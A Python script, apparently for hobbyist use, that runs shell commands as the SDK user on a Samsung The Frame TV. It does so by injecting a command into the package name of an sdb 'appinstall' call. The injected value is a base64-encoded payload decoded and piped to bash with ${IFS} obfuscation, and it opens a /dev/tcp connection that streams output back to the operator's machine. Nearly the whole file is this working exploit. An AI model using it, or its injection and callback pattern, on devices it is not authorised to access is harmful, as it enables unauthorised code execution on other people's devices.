#!/usr/bin/env python3
"""
Run a read-only shell command on a Samsung The Frame TV and print its output.

This TV has intershell disabled (`sdb capability` -> intershell_support:disabled),
so a normal `sdb shell <cmd>` runs nothing useful and `sdb pull` is blocked. The
only way to run code as the SDK user (UID 901) is the well-known `0 appinstall`
package-name command-execution path, which this mirrors from home-remap/remap.py.

Usage:
    TV_IP=<TV_IP> ./tvrun.py 'pkgcmd -l'
    TV_IP=<TV_IP> ./tvrun.py 'cat /etc/tizen-release'

Read-only commands only. Keep commands short (the injection argument is capped
at 400 bytes); for longer work push a script with `sdb push` and run `sh <path>`.
"""
import base64
import os
import socket
import subprocess
import sys
import uuid
from pathlib import Path

SDB = os.environ.get("SDB") or str(Path.home() / "tizen-studio/tools/sdb")


def run(host, command, serial):
    token = uuid.uuid4().hex[:12]

    # Pick our LAN address and a free port for the TV to stream output back to.
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as route:
        route.connect((host, 9))
        local = route.getsockname()[0]

    with socket.socket() as listener:
        listener.bind((local, 0))
        listener.listen(1)
        listener.settimeout(30)
        port = listener.getsockname()[1]

        # The TV opens /dev/tcp back to us and writes the command's stdout+stderr.
        # Wrap in a group so the command's own redirects (>>, 2>&1, etc.) survive.
        full = "exec 3<>/dev/tcp/%s/%d;{ %s; } >&3 2>&3;exec 3>&-" % (local, port, command)
        wrapper = "/bin/mkdir /tmp/s-%s 2>/dev/null&&{ %s;}" % (token, full)
        encoded = base64.b64encode(wrapper.encode()).decode()
        name = "new2.tpk`printf${IFS}%s${IFS}" + encoded + "|base64${IFS}-d|bash`.tpk"
        argument = "0 appinstall tpk " + name
        if len(argument.encode()) > 400:
            raise SystemExit("Injection argument too long (%d bytes); refusing." % len(argument.encode()))

        proc = subprocess.Popen(
            [SDB, "-s", serial, "shell", argument],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        try:
            conn, peer = listener.accept()
            if peer[0] != host:
                raise RuntimeError("Unexpected callback peer %r; no data accepted." % (peer,))
            chunks = []
            with conn:
                conn.settimeout(20)
                while True:
                    b = conn.recv(65536)
                    if not b:
                        break
                    chunks.append(b)
            out = b"".join(chunks).decode(errors="replace")
            try:
                proc.communicate(timeout=8)
            except subprocess.TimeoutExpired:
                proc.terminate()
            return out
        finally:
            if proc.poll() is None:
                proc.terminate()
                proc.communicate(timeout=3)


if __name__ == "__main__":
    host = os.environ.get("TV_IP")
    if not host:
        raise SystemExit("Set TV_IP (e.g. export TV_IP=<TV_IP>)")
    if len(sys.argv) < 2:
        raise SystemExit("Usage: TV_IP=<TV_IP> ./tvrun.py '<read-only command>'")
    serial = host + ":26101"
    command = sys.argv[1]
    sys.stdout.write(run(host, command, serial))
